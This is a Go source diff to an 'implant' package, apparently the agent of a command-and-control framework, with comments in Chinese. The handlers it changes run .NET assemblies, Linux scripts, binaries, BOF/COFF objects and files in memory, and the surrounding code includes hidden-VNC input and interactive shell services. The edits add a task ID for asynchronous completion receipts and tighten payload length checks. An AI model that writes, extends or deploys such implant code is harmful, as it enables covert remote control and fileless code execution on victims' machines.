@@ -7,9 +7,9 @@ import (
 	"errors"
 	"fmt"
 	"implant/core/commands"
-	"implant/core/debuglog"
 	"implant/core/communication"
 	"implant/core/config"
+	"implant/core/debuglog"
 	"implant/core/sysinfo"
 	"implant/core/utils"
 	"io"
@@ -871,7 +871,8 @@ func CmdHvncInput(cmdBuf []byte) ([]byte, error) {
 // Windows内存执行相关功能（从tshell移植）
 
 // CmdExecuteAssembly 处理.NET Assembly内存执行命令
-func CmdExecuteAssembly(cmdBuf []byte) ([]byte, error) {
+// execTaskID 由 dispatch 从 EXD1 头解析，用于异步完成回执（0=旧服务端/无头）。
+func CmdExecuteAssembly(cmdBuf []byte, execTaskID uint32) ([]byte, error) {
 	// 解析文件长度（4字节）
 	if len(cmdBuf) < 4 {
 		return nil, errors.New("Invalid assembly data: missing file length")
@@ -897,7 +898,7 @@ func CmdExecuteAssembly(cmdBuf []byte) ([]byte, error) {
 	}
 
 	// 执行.NET Assembly
-	return commands.ExecuteAssembly(assemblyData, arguments)
+	return commands.ExecuteAssembly(assemblyData, arguments, execTaskID)
 }
 
 // ================ Linux交互式Shell服务函数 ================
@@ -978,8 +979,8 @@ func CmdDualInteractiveShellStop(cmdBuf []byte) ([]byte, error) {
 
 // CmdExecuteLinuxScript Linux脚本内存执行
 func CmdExecuteLinuxScript(cmdBuf []byte) ([]byte, error) {
-	// K2: 边界校验
-	if len(cmdBuf) < 8 {
+	// K2: 边界校验（只需要 4B 长度头；args 是剩余部分，可为空）
+	if len(cmdBuf) < 4 {
 		return nil, errors.New("Invalid script payload")
 	}
 	scriptLen := binary.BigEndian.Uint32(cmdBuf[:4])
@@ -996,7 +997,7 @@ func CmdExecuteLinuxBin(cmdBuf []byte) ([]byte, error) {
 		return nil, errors.New("Invalid exec payload")
 	}
 	fileLen := binary.BigEndian.Uint32(cmdBuf[:4])
-	if int(fileLen) > len(cmdBuf)-4 {
+	if int(fileLen) > len(cmdBuf)-8 { // 还需要 4B argsLen
 		return nil, errors.New("Invalid exec length")
 	}
 	binBytes := cmdBuf[4 : 4+fileLen]
@@ -1015,7 +1016,7 @@ func CmdExecuteBof(cmdBuf []byte) ([]byte, error) {
 		return nil, errors.New("Invalid bof payload")
 	}
 	fileLen := binary.BigEndian.Uint32(cmdBuf[:4])
-	if int(fileLen) > len(cmdBuf)-4 {
+	if int(fileLen) > len(cmdBuf)-8 { // 还需要 4B argsLen
 		return nil, errors.New("Invalid bof length")
 	}
 	coffBytes := cmdBuf[4 : 4+fileLen]
@@ -1034,7 +1035,7 @@ func CmdExecuteFile(cmdBuf []byte) ([]byte, error) {
 		return nil, errors.New("Invalid exec payload")
 	}
 	fileLen := binary.BigEndian.Uint32(cmdBuf[:4])
-	if int(fileLen) > len(cmdBuf)-4 {
+	if int(fileLen) > len(cmdBuf)-8 { // 还需要 4B argsLen
 		return nil, errors.New("Invalid exec length")
 	}
 	fileBytes := cmdBuf[4 : 4+fileLen]
